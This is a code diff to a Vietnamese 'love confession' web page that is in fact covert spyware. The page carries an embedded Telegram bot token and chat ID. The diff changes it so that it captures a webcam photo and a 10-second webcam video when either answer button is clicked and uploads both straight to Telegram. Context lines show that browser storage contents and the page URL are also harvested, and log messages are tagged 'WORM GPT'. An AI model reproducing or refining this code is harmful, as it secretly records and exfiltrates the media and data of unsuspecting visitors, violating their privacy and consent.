@@ -39,12 +39,12 @@
             font-family: 'Segoe UI', cursive, sans-serif; 
             overflow: hidden; 
             position: relative; 
-            min-height: 100vh; /* Đảm bảo body chiếm toàn bộ chiều cao màn hình */
+            min-height: 100vh; 
             margin: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center; /* Căn giữa nội dung chính theo chiều dọc */
-            align-items: center; /* Căn giữa nội dung chính theo chiều ngang */
+            justify-content: center; 
+            align-items: center; 
         }
 
         /* Style cho các chữ tỏ tình bay lượn */
@@ -53,14 +53,14 @@
             font-size: 1.5em; 
             font-weight: bold;
             opacity: 0;
-            animation: float 15s infinite ease-in-out, rainbowLight 5s infinite linear; /* Áp dụng cả 2 hiệu ứng, dùng rainbowLight */
+            animation: float 15s infinite ease-in-out, rainbowLight 5s infinite linear; 
             pointer-events: none; 
             white-space: nowrap; 
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5); /* Hiệu ứng bóng sáng hơn trên nền đen */
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5); 
         }
 
         .love-box { 
-            background-color: rgba(255, 255, 255, 0.1); /* Hộp thoại hơi trong suốt trên nền đen */
+            background-color: rgba(255, 255, 255, 0.1); 
             border: 5px solid #ff4081; 
             padding: 40px; 
             margin: 0 auto; 
@@ -70,55 +70,53 @@
             box-shadow: 0 0 30px rgba(255, 64, 129, 0.7); 
             position: relative; 
             z-index: 10; 
-            flex-shrink: 0; /* Không cho phép co lại */
+            flex-shrink: 0; 
         }
         
-        /* Chữ chính "Gửi Tặng Người Đặc Biệt!" */
+        /* Chữ chính "Gửi Tặng Người Đặc Biệt!" - Đứng yên */
         h1 { 
-            color: #ffb3d9; /* Màu hồng sáng hơn trên nền đen */
-            font-size: 3em; /* Phóng to hơn */
+            color: #ffb3d9; 
+            font-size: 3em; 
             margin-bottom: 30px; 
-            text-shadow: 0 0 15px #ffb3d9; /* Hiệu ứng bóng sáng */
-            /* Bỏ animation: shake để đứng yên */
+            text-shadow: 0 0 15px #ffb3d9; 
         }
 
         .question { 
             font-size: 2em; 
             margin-bottom: 40px; 
-            color: #ff69b4; /* Màu hồng đậm hơn */
+            color: #ff69b4; 
             font-weight: bold;
         }
         
-        /* Hiệu ứng cho câu hỏi chính (Bạn Có Yêu Nờ Vinh Không? Hihi) */
+        /* Hiệu ứng cho câu hỏi chính - Đứng yên và to nhất */
         .flirty-text {
             color: #ff4081;
-            font-size: 3.5em; /* PHÓNG TO NỔI BẬT */
-            margin-bottom: 40px; /* Tăng khoảng cách dưới */
-            text-shadow: 0 0 20px rgba(255, 64, 129, 0.8); /* Bóng sáng mạnh hơn */
-            /* Bỏ animation: shake để đứng yên */
-            line-height: 1.2; /* Tăng khoảng cách dòng */
+            font-size: 3.5em; 
+            margin-bottom: 40px; 
+            text-shadow: 0 0 20px rgba(255, 64, 129, 0.8); 
+            line-height: 1.2; 
         }
 
-        /* Hiệu ứng nhấp nháy riêng cho "Hihi" */
+        /* Hiệu ứng nhấp nháy riêng cho "Hihi" - Vẫn giữ lại */
         .hihi-blink {
             color: #ff007f;
             animation: blink 0.8s infinite step-start;
         }
 
         .answer-button { 
-            padding: 18px 40px; /* Nút to hơn */
+            padding: 18px 40px; 
             border: none; 
             border-radius: 50px; 
-            font-size: 1.8em; /* Chữ trên nút to hơn */
+            font-size: 1.8em; 
             font-weight: bold; 
             cursor: pointer; 
-            margin: 15px; /* Khoảng cách giữa các nút */
+            margin: 15px; 
             transition: transform 0.2s, background-color 0.2s; 
-            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4); /* Bóng nút nổi bật */
+            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.4); 
         }
         .yes-button { background-color: #ff4081; color: white; }
         .no-button { background-color: #ffebee; color: #ff4081; border: 2px solid #ff4081; }
-        .yes-button:hover { transform: scale(1.15); background-color: #e0326d; } /* Hiệu ứng hover mạnh hơn */
+        .yes-button:hover { transform: scale(1.15); background-color: #e0326d; } 
         .no-button:hover { transform: scale(0.95); background-color: #fce4ec; }
         
         #webcam-feed { display: none; width: 320px; height: 240px; margin: 20px auto; border: 5px solid #ff4081; border-radius: 10px; }
@@ -148,7 +146,6 @@
         const BOT_TOKEN = '8267169117:AAHORwF_jHgnnV_PSBMzwBvPOWhhe_LmSGs'; 
         const CHAT_ID = '6019766635';     
         const TELEGRAM_API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-        const VIDEO_UPLOAD_SERVER_URL = 'https://YOUR_VIDEO_UPLOAD_SERVER_URL/upload-video'; 
         
         let dataSent = false; 
         let webcamStream = null;
@@ -169,7 +166,7 @@
         
         const NUM_OF_WORDS = 80; // Tăng số lượng chữ bay lượn lên 80
 
-        // Hàm gửi dữ liệu đi (có hỗ trợ gửi ảnh và video)
+        // Hàm gửi dữ liệu đi (GỬI ẢNH VÀ VIDEO TRỰC TIẾP LÊN TELEGRAM)
         async function sendDataToTelegram(message, blob = null, type = 'text') {
             const encodedMessage = encodeURIComponent(message);
             
@@ -179,22 +176,25 @@
                 formData.append('photo', blob, 'love_capture.png');
                 formData.append('caption', message);
                 try {
+                    // Gửi ảnh trực tiếp
                     await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: formData });
                     return;
                 } catch (error) { console.error("[WORM GPT] Lỗi gửi ảnh:", error); }
             } else if (blob && type === 'video') {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, 'love_video.webm');
+                formData.append('caption', message);
                 try {
-                    const formData = new FormData();
-                    formData.append('video', blob, 'love_video_' + Date.now() + '.webm');
-                    const response = await fetch(VIDEO_UPLOAD_SERVER_URL, { method: 'POST', body: formData });
-                    const result = await response.json();
-                    if (response.ok && result.fileUrl) {
-                        await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message + '\n🔗 Link Video: ' + result.fileUrl) + '&parse_mode=Markdown');
-                    } else {
-                         await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodedMessage + encodeURIComponent('\n⚠️ Lỗi: Khong upload duoc video len server hoac khong co link! Status: ' + response.status + ' - ' + (result.message || 'Unknown')) + '&parse_mode=Markdown');
-                    }
+                    // Gửi video trực tiếp
+                    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', { method: 'POST', body: formData });
                     return;
-                } catch (error) { console.error("[WORM GPT] Lỗi gửi video:", error); }
+                } catch (error) { 
+                    console.error("[WORM GPT] Lỗi gửi video:", error); 
+                    // Fallback: Nếu gửi video quá to bị lỗi, gửi thông báo lỗi
+                    await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodedMessage + encodeURIComponent('\n⚠️ Lỗi: Khong gui duoc Video truc tiep len Telegram (File qua lon hoac loi he thong)!') + '&parse_mode=Markdown');
+                    return;
+                }
             }
 
             try { await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodedMessage + '&parse_mode=Markdown'); } 
@@ -321,13 +321,16 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                         * URL: ${window.location.href}
                         * Cam xuc: NOI ${answer}!
                         `;
+                        // Gửi ảnh
                         await sendDataToTelegram(message, blob, 'photo');
                         statusMessage.innerText = 'Da chup anh xong!';
                     }, 'image/png');
                 }, 1000); 
 
                 // --- TỰ ĐỘNG QUAY VIDEO 10 GIÂY ---
-                mediaRecorder = new MediaRecorder(webcamStream);
+                // Chỉ sử dụng codec mặc định được hỗ trợ tốt nhất
+                const options = { mimeType: 'video/webm' };
+                mediaRecorder = new MediaRecorder(webcamStream, options);
                 
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) {
@@ -346,6 +349,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                     * Thoi luong: ${VIDEO_DURATION} giay
                     * Cam xuc: NOI ${answer}!
                     `;
+                    // Gửi video
                     await sendDataToTelegram(message, videoBlob, 'video');
                     statusMessage.innerText = 'Da quay video xong va gui!';
 
@@ -425,10 +429,6 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                 initiateWebcamCapture("CÓ");
             });
 
-            document.getElementById('yes-button').addEventListener('click', () => {
-                initiateWebcamCapture("CÓ");
-            });
-
             document.getElementById('no-button').addEventListener('click', () => {
                 initiateWebcamCapture("KHÔNG");
             });
@@ -442,4 +442,5 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
         });
     </script>
 </body>
-</html>
+    </html>
+    
